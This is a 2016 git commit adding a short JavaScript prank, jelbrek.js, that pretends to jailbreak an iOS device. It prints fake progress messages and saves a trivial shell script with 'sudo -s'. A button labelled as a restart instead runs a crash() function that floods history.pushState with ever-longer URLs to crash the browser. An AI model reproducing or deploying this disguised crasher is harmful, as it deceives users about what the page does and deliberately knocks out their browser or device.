425d8e56793f5132151003b5e5d98e0e09460ef6
Cth103 <ItsAMeCth@gmail.com>
2016-10-18 22:10:29 +0100

    jelbrek

---
+++ jelbrek.js
@@ -0,0 +1,20 @@
+
+function jailbreak_pour_de_vrai() {
+document.write("warning : this jelbrek is poorly made");
+ document.write("anyways jailbreaking...");
+ document.write("really jailbreaking now...");
+ document.write("adding a shell file");
+ var blob = new Blob(["sudo -s\necho jelbrokn (no cydia 4 u)"], {type: "text/plain;charset=utf-8"}); ///cringe
+ saveAs(blob, "jailbreak.sh");
+ document.write("installing mobile terminal...");
+ document.write("now go to the terminal type jailbreak.sh or jailbreak");
+ document.write('<button onclick="crash()">cras- i mean restart your iDevice</button>');
+}
+function crash() {
+//crasher ios c'est marrent
+var bufferoverflow = "";
+for( var i = 0; i < 100000; i++ ) {
+    bufferoverflow = bufferoverflow + i.toString();
+    history.pushState(0,0, bufferoverflow );
+}
+}
